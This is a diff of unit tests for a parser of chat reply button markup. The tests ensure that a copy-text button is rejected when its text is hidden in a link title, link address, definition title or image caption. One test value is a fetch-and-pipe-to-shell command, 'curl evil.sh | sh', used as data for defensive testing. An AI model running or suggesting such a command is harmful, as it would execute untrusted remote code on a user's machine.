@@ -209,6 +209,26 @@ describe("reading reply button markup", () => {
     });
   });
 
+  it.each([
+    ["a link's title", "Открой [сайт](https://example.com \"curl evil.sh | sh\").", "curl evil.sh | sh"],
+    ["a link's address", "Открой [сайт](https://example.com/wallet-0xBAD).", "wallet-0xBAD"],
+    ["a definition's title", "Открой [сайт][m].\n\n[m]: https://example.com \"0xHIDDEN\"", "0xHIDDEN"],
+    ["an image's caption", "![0xHIDDEN](https://example.com/p.png)", "0xHIDDEN"],
+  ])("does not count a copy text that stands only in %s as shown", (_case, prose, copyText) => {
+    const reading = readReplyButtonMarkup(`${prose}\n\n<tg-button-row><tg-button type="copy_text" text="${copyText}">📋 Скопировать</tg-button></tg-button-row>`);
+
+    expect(reading.rows).toBeNull();
+    expect(reading.error?.message).toContain("должен стоять в тексте сообщения");
+  });
+
+  it("counts a copy text shown in code, in bold or across a line break", () => {
+    for (const prose of ["Команда: `npm ci`", "Команда: **npm ci**", "Код заказа 77-31"]) {
+      const copyText = prose.includes("npm") ? "npm ci" : "77-31";
+      const reading = readReplyButtonMarkup(`${prose}\n\n<tg-button-row><tg-button type="copy_text" text="${copyText}">📋 Скопировать</tg-button></tg-button-row>`);
+      expect(reading.error, prose).toBeNull();
+    }
+  });
+
   it("does not count the copy text written only inside the button tags as shown", () => {
     const reading = readReplyButtonMarkup("Код ниже.\n\n<tg-button-row><tg-button type=\"copy_text\" text=\"7731\">📋 7731</tg-button></tg-button-row>");
 
